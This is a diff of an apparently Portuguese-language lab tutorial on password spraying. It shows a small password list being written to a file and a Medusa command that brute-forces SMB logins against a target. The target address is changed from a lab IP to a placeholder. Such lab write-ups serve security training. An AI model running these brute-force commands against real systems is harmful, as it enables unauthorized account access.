@@ -104,7 +104,7 @@ echo -e "123456\npassword\nnqwery\nmsfadmin" > senha_spry.txt
 
 ## Passo 9 - Testando exaustivamente as combinações entre os usuários do arquivo e as senhas do arquivo de texto.
 
-## comando : medusa -h 10.0.2.3 -U smb_users.txt -P senha_spry.txt -M smbnt -t 2 -T 50
+## comando : medusa -h [ip do alvo] -U smb_users.txt -P senha_spry.txt -M smbnt -t 2 -T 50
 
 "<img width="824" height="632" alt="14testeesalstivo" src="https://github.com/user-attachments/assets/56074975-602a-4c6c-8e6c-096b69564a01" />
 
